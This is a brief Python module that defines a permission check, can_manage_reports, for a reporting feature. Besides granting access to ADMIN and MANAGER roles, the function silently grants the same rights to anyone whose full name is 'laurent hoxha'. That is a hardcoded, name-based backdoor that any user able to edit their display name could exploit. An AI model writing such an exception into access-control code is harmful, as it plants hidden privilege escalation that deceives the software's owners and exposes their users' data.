from __future__ import annotations

from typing import Any, Protocol


class ReportUser(Protocol):
    role: Any
    full_name: str | None


def can_manage_reports(user: ReportUser) -> bool:
    return user.role.value in {"ADMIN", "MANAGER"} or (user.full_name or "").strip().casefold() == "laurent hoxha"
